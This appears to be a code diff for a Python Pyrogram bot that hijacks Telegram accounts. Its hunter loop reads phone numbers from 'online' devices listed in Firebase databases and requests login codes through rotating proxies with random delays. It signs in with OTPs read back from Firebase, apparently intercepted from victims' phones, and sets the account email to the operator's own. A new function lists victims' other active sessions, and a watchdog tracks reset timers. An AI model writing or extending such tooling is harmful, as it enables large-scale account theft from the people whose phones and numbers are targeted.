@@ -3,8 +3,9 @@ import logging
 import time
 import random
 from pyrogram import Client
-from pyrogram.errors import SessionPasswordNeeded, FloodWait, PhoneCodeInvalid, RPCError, PhoneCodeExpired
+from pyrogram.errors import SessionPasswordNeededError, FloodWait, PhoneCodeInvalid, RPCError, PhoneCodeExpired
 from pyrogram.enums import SentCodeType
+from pyrogram.raw.functions.account import GetAuthorizations
 import config
 import database as db
 import firebase_utils as fbu
@@ -55,6 +56,48 @@ def get_proxy(d, attempt=0):
             return {"scheme": "socks5", "hostname": ip, "port": int(port)}
         except: return None
     return None
+
+# 🚨 NAYA FUNCTION: Manage Devices (Sirf dikhane ke liye)
+async def get_user_devices(phone: str):
+    d = db.load_data()
+    acc = d.get("telegram_accounts", {}).get(phone)
+    if not acc or not acc.get("session"):
+        return None, "❌ Is number ka session DB me nahi hai. Pehle /tglogin karein."
+
+    session_str = acc["session"]
+    app = None
+    try:
+        app = Client(
+            f"temp_dev_{phone.replace('+','')}", 
+            api_id=config.TG_API_ID, 
+            api_hash=config.TG_API_HASH, 
+            session_string=session_str, 
+            in_memory=True
+        )
+        await app.connect()
+        
+        res = await app.invoke(GetAuthorizations())
+        devices = []
+        for auth in res.authorizations:
+            if auth.current:
+                continue # Bot ka khud ka session skip kar diya
+            
+            # Date format
+            date_str = time.strftime('%d-%m-%Y %H:%M', time.localtime(auth.date_created))
+            
+            devices.append({
+                "app_name": auth.app_name,
+                "device_model": auth.device_model,
+                "platform": auth.platform,
+                "country": auth.country,
+                "date": date_str
+            })
+            
+        await app.disconnect()
+        return devices, None
+    except Exception as e:
+        if app and app.is_connected: await app.disconnect()
+        return None, f"Error: {str(e)}"
 
 async def auto_login_manual(bot, phone_number):
     log.info(f"Manual Login triggered for {phone_number}")
@@ -117,7 +160,6 @@ async def auto_hunter_loop(bot):
             if not d.get("hunting_enabled", True):
                 await asyncio.sleep(10)
                 continue
-
             online_devices = []
             for fb in d.get("firebases", [])[:10]:
                 clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
@@ -125,28 +167,21 @@ async def auto_hunter_loop(bot):
                 for dev_id, c in clients.items():
                     if isinstance(c, dict) and c.get("status") is True:
                         online_devices.append((fb, dev_id, c))
-
             for fb, dev_id, dev_data in online_devices:
                 best_nums = fbu.extract_best_numbers(dev_data, [])
                 if not best_nums: continue
                 phone = f"+91{best_nums[0][0]}"
-                
                 if phone in d.get("telegram_accounts", {}) and d["telegram_accounts"][phone].get("status") == "active":
                     continue
-                
                 delay = random.randint(60, 180)
                 log.info(f"Hunter sleeping for {delay} seconds before targeting {phone}...")
                 await asyncio.sleep(delay)
-                
                 d = db.load_data()
                 if phone in d.get("telegram_accounts", {}) and d["telegram_accounts"][phone].get("status") == "active":
                     continue
-
                 await update_owner_progress(bot, f"🎯 Target: <code>{phone}</code>\n📱 Device: <code>{dev_id[:8]}</code>")
-                
                 app = None
                 sent_code = None
-                
                 for attempt in range(2):
                     proxy_dict = get_proxy(d, attempt)
                     try:
@@ -162,14 +197,11 @@ async def auto_hunter_loop(bot):
                     except Exception as e:
                         if app and app.is_connected: await app.disconnect()
                         log.warning(f"Hunter attempt {attempt+1} failed: {e}")
-
                 if not sent_code: continue
-
                 otp = await wait_for_firebase_otp(phone)
                 if not otp:
                     if app and app.is_connected: await app.disconnect()
                     continue
-                
                 try:
                     await app.sign_in(phone, sent_code.phone_code_hash, otp)
                     await app.update_profile(email=config.MASTER_EMAIL)
@@ -198,11 +230,9 @@ async def reset_watchdog_loop(bot):
             if not d.get("hunting_enabled", True):
                 await asyncio.sleep(3600)
                 continue
-                
             tg_accounts = d.get("telegram_accounts", {})
             now = int(time.time())
             updated = False
-            
             for phone, acc in tg_accounts.items():
                 if acc.get("status") == "waiting_7_days" and now >= acc.get("reset_time", 0):
                     await update_owner_progress(bot, f"🕒 <b>7 Day Timer Complete!</b>\nAccount: <code>{phone}</code>")
@@ -214,7 +244,6 @@ async def reset_watchdog_loop(bot):
                         acc["status"] = "failed"
                         acc["reason"] = res["reason"]
                     updated = True
-            
             if updated: db.save_data(d)
             await asyncio.sleep(3600)
         except Exception as e:
